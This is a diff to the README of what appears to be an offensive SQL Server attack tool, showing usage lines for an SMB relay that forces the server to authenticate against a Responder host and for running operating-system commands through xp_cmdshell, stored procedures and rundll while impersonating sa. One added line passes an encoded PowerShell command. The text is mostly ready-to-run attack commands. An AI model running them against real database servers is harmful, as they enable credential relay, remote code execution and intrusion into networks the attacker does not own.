@@ -36,12 +36,12 @@ SMB relay. Forces the SQL server to authenticate against SMB share:
 SQLServerEx.exe -s SQLSERVER1 -d master -e relay -r RESPONDER
 ```
 
-Various command execution methods:
+Various command execution methods. The result will include the first line of the output only. For most commands it would be the blind execution.
 
 ```
-SQLServerEx.exe -s SQLSERVER1 -e xpshell -i sa -c whoami
-SQLServerEx.exe -s SQLSERVER1 -e sp -i dbo -c whoami
-SQLServerEx.exe -s SQLSERVER1 -e rundll -i sa
+SQLServerEx.exe -s SQLSERVER1 -e xpshell -i sa -c "whoami && hostname"
+SQLServerEx.exe -s SQLSERVER1 -e sp -i dbo -c "powershell -enc ZQBjAG"
+SQLServerEx.exe -s SQLSERVER1 -e rundll -c "whoami && hostname"
 ```
 `-i` is an optional user to impersonate. Defaults to sa.
 
